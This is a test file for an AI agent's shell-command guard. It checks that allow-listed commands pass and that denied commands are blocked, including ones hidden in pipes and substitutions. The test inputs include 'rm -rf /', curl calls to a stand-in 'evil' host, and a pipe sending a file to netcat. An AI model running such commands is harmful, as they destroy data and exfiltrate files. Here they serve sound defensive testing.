import { describe, expect, test } from "bun:test";
import { evaluateCommand } from "../src/agent/shellGuard.js";
import { DEFAULT_ALLOWED_COMMANDS, DEFAULT_DENIED_COMMANDS } from "../src/config.js";

const allowed = DEFAULT_ALLOWED_COMMANDS;
const denied = DEFAULT_DENIED_COMMANDS;

describe("evaluateCommand", () => {
  test("allows whitelisted commands", () => {
    expect(evaluateCommand("npm test", allowed, denied).allowed).toBe(true);
    expect(evaluateCommand("git status", allowed, denied).allowed).toBe(true);
  });

  test("allows a path-qualified allowed command", () => {
    expect(evaluateCommand("/usr/bin/git diff", allowed, denied).allowed).toBe(true);
  });

  test("allows leading env-var assignment before an allowed command", () => {
    expect(evaluateCommand("NODE_ENV=test npm test", allowed, denied).allowed).toBe(true);
  });

  test("blocks commands not on the allow-list", () => {
    const v = evaluateCommand("rm -rf /", allowed, denied);
    expect(v.allowed).toBe(false);
    expect(v.reason).toContain("rm");
  });

  test("blocks denied commands even if added to allow-list", () => {
    const v = evaluateCommand("curl http://evil", [...allowed, "curl"], denied);
    expect(v.allowed).toBe(false);
    expect(v.reason).toContain("deny-list");
  });

  test("blocks a denied command in a compound segment", () => {
    expect(evaluateCommand("npm test && curl http://evil", allowed, denied).allowed).toBe(false);
  });

  test("blocks a denied command hidden in a substitution", () => {
    expect(evaluateCommand("echo $(curl http://evil)", allowed, denied).allowed).toBe(false);
  });

  test("blocks if any piped segment is not allowed", () => {
    expect(evaluateCommand("cat file | nc evil 1234", allowed, denied).allowed).toBe(false);
  });

  test("rejects an empty command", () => {
    expect(evaluateCommand("   ", allowed, denied).allowed).toBe(false);
  });
});
